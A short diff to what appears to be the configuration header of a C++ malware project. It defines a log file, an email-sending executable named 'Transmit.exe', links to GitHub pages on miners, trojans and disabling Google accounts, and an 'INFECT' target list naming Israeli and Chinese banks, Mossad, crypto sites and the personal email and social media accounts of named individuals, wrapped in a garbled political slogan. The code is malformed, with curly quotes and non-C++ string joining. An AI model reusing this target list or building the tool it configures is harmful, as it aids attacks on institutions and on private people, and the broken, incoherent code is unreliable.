@@ -19,9 +19,10 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!”
 #define RUN_FILE_NAME “IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!”
-#define RUN_Link_NAME “https://desktop.github.com/download/"."https://github.com/Topics/download_minners"."https://github.com/topics/trojan?l=c%23"
-#define INFECT_Link_NAME "https://Boi.org.il"."https://www.bochk.com/"."https://www.boc.cn"."https://www.bankofisrael.com.il"."https://icloud.com/mail/israel"."https://workspace.google.com/gmail/en-il"."https://adsense.google.com/intl/en-il"."https://www.vissa-online.com.il"."https://www.litecoin.cn"."https://www.fbs.org"."https://www.mossad.gov.il"
+#define RUN_Link_NAME “https://desktop.github.com/download/"."https://github.com/Topics/download_minners"."https://github.com/Topics/google/Disable-account/"
+#define INFECT_Link_NAME "https://workspace.google.com/intl/en/yusufmansur@gmail.com"."https://workspace.google.com/intl/en/wirdamansur@gmail.com"."https://www.instagram.com/daarul_mansur/"."https://daqu.id/"."https://www.facebook.com/UstadzYusufMansur/"."https://www.al-enterprise.com/en/company/customers/paytren"."https://www.google.co.il"."https://boi.org.il"."https://icloud.com/mail/en-nl"."https://workspace.google.com/gmail/en-esp"."https://adsense.google.com/intl/id_id"."https://www.vissa-online.com"."https://www.litecoin.cn"."https://www.fbs.org"."https://www.bitcoin.org"."https://adsense.google.com/intl/en"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
+
 
 
 
